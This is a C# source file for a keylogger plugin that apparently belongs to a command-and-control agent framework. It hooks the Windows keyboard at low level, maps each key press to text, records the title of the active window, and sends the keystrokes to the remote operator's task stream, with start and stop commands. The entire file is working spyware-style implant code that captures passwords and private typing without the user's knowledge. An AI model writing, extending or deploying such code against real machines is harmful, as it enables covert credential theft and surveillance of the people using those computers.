using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "keylogger";
        private bool isRunning = false;
        public string task_id = String.Empty;
        public CancellationTokenSource cts = new CancellationTokenSource();
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {

            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            if (args["action"].ToLower() == "stop")
            {
                if (this.isRunning)
                {
                    cts.Cancel();
                    this.isRunning = false;
                    await messageManager.WriteLine("Tasked to stop.", job.task.id, true);
                }
                else
                {
                    await messageManager.WriteLine("Task is not running.", job.task.id, true);
                }
            }
            else
            {
                if(!this.isRunning)
                {
                    cts = new CancellationTokenSource();
                    StartKeylogger(job.task.id);
                    await messageManager.WriteLine("Keylogger started.", job.task.id, true);
                }
                else
                {
                    await messageManager.WriteLine("Already running", job.task.id, true);
                }
            }
        }
        public bool StartKeylogger(string task_id)
        {
            this.isRunning = true;
            this.task_id = task_id;

            try
            {
                Native.HookProc callback = CallbackFunction;
                var module = Process.GetCurrentProcess().MainModule.ModuleName;
                var moduleHandle = Native.GetModuleHandle(module);
                var hook = Native.SetWindowsHookEx(Native.HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
                while (!cts.Token.IsCancellationRequested)
                {
                    Native.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                    System.Threading.Thread.Sleep(5);
                }

                Native.UnhookWindowsHookEx(hook);

                messageManager.WriteLine("Finished executing.", task_id, true);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex.Message);
                Console.WriteLine("[X] Stack Trace: {0}", ex.StackTrace);
            }


            return true;
        }
        private async Task HandleKeyStroke(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            Int32 msgType = wParam.ToInt32();
            Int32 vKey;
            string key = "";
            if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
            {
                bool shift = false;
                IntPtr hWindow = Native.GetForegroundWindow();
                short shiftState = Native.GetAsyncKeyState(0x10);
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;

                // read virtual key from buffer
                vKey = Marshal.ReadInt32(lParam);

                // Parse key
                if (vKey > 64 && vKey < 91)
                {
                    if (shift | caps)
                    {
                        key = ((Native.AthenaKeys)vKey).ToString();
                    }
                    else
                    {
                        key = ((Native.AthenaKeys)vKey).ToString().ToLower();
                    }
                }
                else if (vKey >= 96 && vKey <= 111)
                {
                    switch (vKey)
                    {
                        case 96:
                            key = "0";
                            break;
                        case 97:
                            key = "1";
                            break;
                        case 98:
                            key = "2";
                            break;
                        case 99:
                            key = "3";
                            break;
                        case 100:
                            key = "4";
                            break;
                        case 101:
                            key = "5";
                            break;
                        case 102:
                            key = "6";
                            break;
                        case 103:
                            key = "7";
                            break;
                        case 104:
                            key = "8";
                            break;
                        case 105:
                            key = "9";
                            break;
                        case 106:
                            key = "*";
                            break;
                        case 107:
                            key = "+";
                            break;
                        case 108:
                            key = "|";
                            break;
                        case 109:
                            key = "-";
                            break;
                        case 110:
                            key = ".";
                            break;
                        case 111:
                            key = "/";
                            break;
                    }
                }
                else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
                {
                    if (shift)
                    {
                        switch (vKey)
                        {
                            case 48:
                                key = ")";
                                break;
                            case 49:
                                key = "!";
                                break;
                            case 50:
                                key = "@";
                                break;
                            case 51:
                                key = "#";
                                break;
                            case 52:
                                key = "$";
                                break;
                            case 53:
                                key = "%";
                                break;
                            case 54:
                                key = "^";
                                break;
                            case 55:
                                key = "&";
                                break;
                            case 56:
                                key = "*";
                                break;
                            case 57:
                                key = "(";
                                break;
                            case 186:
                                key = ":";
                                break;
                            case 187:
                                key = "+";
                                break;
                            case 188:
                                key = "<";
                                break;
                            case 189:
                                key = "_";
                                break;
                            case 190:
                                key = ">";
                                break;
                            case 191:
                                key = "?";
                                break;
                            case 192:
                                key = "~";
                                break;
                            case 219:
                                key = "{";
                                break;
                            case 220:
                                key = "|";
                                break;
                            case 221:
                                key = "}";
                                break;
                            case 222:
                                key = "<Double Quotes>";
                                break;
                        }
                    }
                    else
                    {
                        switch (vKey)
                        {
                            case 48:
                                key = "0";
                                break;
                            case 49:
                                key = "1";
                                break;
                            case 50:
                                key = "2";
                                break;
                            case 51:
                                key = "3";
                                break;
                            case 52:
                                key = "4";
                                break;
                            case 53:
                                key = "5";
                                break;
                            case 54:
                                key = "6";
                                break;
                            case 55:
                                key = "7";
                                break;
                            case 56:
                                key = "8";
                                break;
                            case 57:
                                key = "9";
                                break;
                            case 186:
                                key = ";";
                                break;
                            case 187:
                                key = "=";
                                break;
                            case 188:
                                key = ",";
                                break;
                            case 189:
                                key = "-";
                                break;
                            case 190:
                                key = ".";
                                break;
                            case 191:
                                key = "/";
                                break;
                            case 192:
                                key = "`";
                                break;
                            case 219:
                                key = "[";
                                break;
                            case 220:
                                key = "\\";
                                break;
                            case 221:
                                key = "]";
                                break;
                            case 222:
                                key = "<Single Quote>";
                                break;
                        }
                    }
                }
                else
                {
                    switch ((Native.AthenaKeys)vKey)
                    {
                        case Native.AthenaKeys.F1:
                            key = "<F1>";
                            break;
                        case Native.AthenaKeys.F2:
                            key = "<F2>";
                            break;
                        case Native.AthenaKeys.F3:
                            key = "<F3>";
                            break;
                        case Native.AthenaKeys.F4:
                            key = "<F4>";
                            break;
                        case Native.AthenaKeys.F5:
                            key = "<F5>";
                            break;
                        case Native.AthenaKeys.F6:
                            key = "<F6>";
                            break;
                        case Native.AthenaKeys.F7:
                            key = "<F7>";
                            break;
                        case Native.AthenaKeys.F8:
                            key = "<F8>";
                            break;
                        case Native.AthenaKeys.F9:
                            key = "<F9>";
                            break;
                        case Native.AthenaKeys.F10:
                            key = "<F10>";
                            break;
                        case Native.AthenaKeys.F11:
                            key = "<F11>";
                            break;
                        case Native.AthenaKeys.F12:
                            key = "<F12>";
                            break;

                        //case Native.AthenaKeys.Snapshot:
                        //    key = "<Print Screen>";
                        //    break;
                        //case Native.AthenaKeys.Scroll:
                        //    key = "<Scroll Lock>";
                        //    break;
                        //case Native.AthenaKeys.Pause:
                        //    key = "<Pause/Break>";
                        //    break;
                        case Native.AthenaKeys.INSERT:
                            key = "<Insert>";
                            break;
                        //case Native.AthenaKeys.Home:
                        //    key = "<Home>";
                        //    break;
                        case Native.AthenaKeys.DELETE:
                            key = "<Delete>";
                            break;
                        //case Native.AthenaKeys.End:
                        //    key = "<End>";
                        //    break;
                        //case Native.AthenaKeys.Prior:
                        //    key = "<Page Up>";
                        //    break;
                        //case Native.AthenaKeys.Next:
                        //    key = "<Page Down>";
                        //    break;
                        //case Native.AthenaKeys.Escape:
                        //    key = "<Esc>";
                        //    break;
                        //case Native.AthenaKeys.NumLock:
                        //    key = "<Num Lock>";
                        //    break;
                        //case Native.AthenaKeys.Capital:
                        //    key = "<Caps Lock>";
                        //    break;
                        case Native.AthenaKeys.TAB:
                            key = "<Tab>";
                            break;
                        case Native.AthenaKeys.BACK:
                            key = "<Backspace>";
                            break;
                        case Native.AthenaKeys.ENTER:
                            key = "<Enter>";
                            break;
                        case Native.AthenaKeys.SPACE:
                            key = "<Space Bar>";
                            break;
                        case Native.AthenaKeys.LEFT:
                            key = "<Left>";
                            break;
                        case Native.AthenaKeys.UP:
                            key = "<Up>";
                            break;
                        case Native.AthenaKeys.RIGHT:
                            key = "<Right>";
                            break;
                        case Native.AthenaKeys.DOWN:
                            key = "<Down>";
                            break;
                        case Native.AthenaKeys.LMENU:
                            key = "<Alt>";
                            break;
                        case Native.AthenaKeys.RMENU:
                            key = "<Alt>";
                            break;
                        case Native.AthenaKeys.LWIN:
                            key = "<Windows Key>";
                            break;
                        case Native.AthenaKeys.RWIN:
                            key = "<Windows Key>";
                            break;
                        //case Native.AthenaKeys.LShiftKey:
                        //    key = "<Shift>";
                        //    break;
                        //case Native.AthenaKeys.RShiftKey:
                        //    key = "<Shift>";
                        //    break;
                        case Native.AthenaKeys.LCONTROL:
                            key = "<Ctrl>";
                            break;
                        case Native.AthenaKeys.RCONTROL:
                            key = "<Ctrl>";
                            break;
                    }
                }

                StringBuilder title = new StringBuilder(256);
                Native.GetWindowText(hWindow, title, title.Capacity);


                messageManager.AddKeystroke(title.ToString(), this.task_id, key);


                //if (!this._keylogOutput.ContainsKey(title.ToString()))
                //{
                //    this._keylogOutput.Add(title.ToString(), new StringBuilder());
                //}
                //Console.Write(key);
                //this._keylogOutput[title.ToString()].Append(key);
            }
        }
        private IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            HandleKeyStroke(code, wParam, lParam);
            return Native.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }



    }
}

